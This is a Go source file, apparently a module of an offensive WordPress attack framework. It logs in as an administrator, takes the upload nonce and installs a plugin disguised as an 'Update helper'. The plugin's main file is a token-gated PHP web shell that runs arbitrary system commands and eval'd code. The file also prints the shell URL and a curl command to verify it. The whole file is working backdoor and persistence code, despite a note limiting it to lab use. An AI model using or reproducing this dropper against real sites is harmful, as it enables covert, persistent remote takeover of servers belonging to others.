// Package backdoor contains shell upload and persistence modules.
package backdoor

import (
	"archive/zip"
	"bytes"
	"context"
	"fmt"
	"regexp"
	"strings"

	"github.com/lab/wpforge/internal/engine"
	"github.com/lab/wpforge/internal/module"
	"github.com/lab/wpforge/internal/registry"
)

func init() { registry.Register(PluginUpload{}) }

// PluginUpload module: authenticate as admin, upload a plugin ZIP containing
// a PHP shell via /wp-admin/plugin-install.php (upload plugin flow).
// Requires valid admin creds in t.Creds (chain from access modules).
type PluginUpload struct{}

// ShellPHP is a minimal, token-gated command shell dropped as a plugin.
// Token prevents random third parties from using the shell on a compromised host.
const ShellPHP = `<?php
/* wpforge lab shell - authorized lab use only */
$token = 'changeme-token';
if (!isset($_REQUEST['t']) || !hash_equals($token, (string)$_REQUEST['t'])) { http_response_code(404); exit('Not Found'); }
if (isset($_REQUEST['c'])) { system($_REQUEST['c']); }
if (isset($_REQUEST['e'])) { eval($_REQUEST['e']); }
?>`

func (PluginUpload) Meta() module.Meta {
	return module.Meta{
		ID:         "backdoor-plugin-upload",
		Name:       "Admin plugin upload (PHP shell dropper)",
		Component:  "core (plugin-install.php)",
		Primitive:  module.PrimitiveBackdoor,
		AuthLevel:  module.AuthAdmin,
		References: []string{"wp-admin/plugin-install.php"},
		Notes:      "Needs admin credentials. Uploads a plugin ZIP whose main file is a token-gated PHP shell.",
	}
}

func (PluginUpload) Params() []module.ParamSpec {
	return []module.ParamSpec{
		{Name: "shellname", Label: "Shell plugin slug", Required: false, Default: "wp-update-helper"},
		{Name: "token", Label: "Shell access token", Required: false, Default: "changeme-token"},
	}
}

func (PluginUpload) Run(ctx context.Context, t *module.Target, params map[string]string, log module.Logger) *module.Result {
	res := &module.Result{Artifacts: map[string]string{}}
	if t.Creds.Username == "" {
		res.Err = fmt.Errorf("module requires credentials; run an access module first")
		res.Summary = "no credentials in target state"
		log.Errorf("%v", res.Err)
		return res
	}
	slug := params["shellname"]
	if slug == "" {
		slug = "wp-update-helper"
	}
	token := params["token"]
	if token == "" {
		token = "changeme-token"
	}

	log.Infof("logging in as %s ...", t.Creds.Username)
	if err := t.Client.WPLogin(ctx, t.Creds.Username, t.Creds.Password); err != nil {
		res.Err = err
		res.Summary = "login failed"
		log.Errorf("login failed: %v", err)
		return res
	}
	log.Successf("authenticated (cookies stored in engine jar)")

	log.Infof("fetching plugin-install page for nonce ...")
	code, body, err := t.Client.Get(ctx, "/wp-admin/plugin-install.php")
	if err != nil || code != 200 {
		res.Err = fmt.Errorf("plugin-install fetch failed: status=%d err=%v", code, err)
		log.Errorf("%v", res.Err)
		return res
	}
	nonce := firstMatch(body, `name="_wpnonce" value="([a-f0-9]{10})"`)
	if nonce == "" {
		nonce = firstMatch(body, `_wpnonce=([a-f0-9]{10})`)
	}
	if nonce == "" {
		res.Err = fmt.Errorf("could not extract upload nonce")
		log.Errorf("%v", res.Err)
		return res
	}
	log.Successf("upload nonce: %s", nonce)

	log.Infof("building plugin archive %s ...", slug)
	zipBytes, err := buildPluginZip(slug, token)
	if err != nil {
		res.Err = err
		log.Errorf("zip build failed: %v", err)
		return res
	}

		log.Infof("uploading plugin (%d bytes) ...", len(zipBytes))
	uploadPath := "/wp-admin/update.php?action=upload-plugin"
	zipCT := "application/zip"
	if code, body, err := t.Client.MultipartPost(ctx, uploadPath, map[string]string{
		"_wpnonce": nonce,
		"action":   "upload-plugin",
	}, map[string]engine.UploadFile{pluginZipField: {Filename: slug + ".zip", Content: zipBytes, ContentType: zipCT}}); err != nil || code != 200 {
		res.Err = fmt.Errorf("upload failed: status=%d err=%v", code, err)
		log.Errorf("%v", res.Err)
		log.Rawf("response snippet: %.400s", body)
		return res
	}
	shellURL := strings.TrimRight(t.BaseURL, "/") + "/wp-content/plugins/" + slug + "/" + slug + ".php?t=" + token
	log.Successf("shell installed: %s", shellURL)
	log.Infof("verify with: curl '%s&c=whoami'", shellURL)
	res.Success = true
	res.Summary = "shell at " + shellURL
	res.Artifacts["shell_url"] = shellURL
	return res
}

const pluginZipField = "pluginzip"

// buildPluginZip creates a minimal plugin archive in memory.
func buildPluginZip(slug, token string) ([]byte, error) {
	main := strings.ReplaceAll(ShellPHP, "changeme-token", token)
	header := fmt.Sprintf(`<?php
/*
Plugin Name: %s
Description: Update helper.
Version: 1.0
*/
`, slug)
	// ZIP construction via archive/zip inline.
	return zipInMemory(map[string]string{
		slug + "/" + slug + ".php": header + main,
	})
}

func firstMatch(body, pattern string) string {
	re := regexp.MustCompile(pattern)
	m := re.FindStringSubmatch(body)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

// zipInMemory builds an in-memory ZIP archive from path->content map.
func zipInMemory(files map[string]string) ([]byte, error) {
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	for path, content := range files {
		f, err := w.Create(path)
		if err != nil {
			return nil, err
		}
		if _, err := f.Write([]byte(content)); err != nil {
			return nil, err
		}
	}
	if err := w.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

var _ module.Module = PluginUpload{}
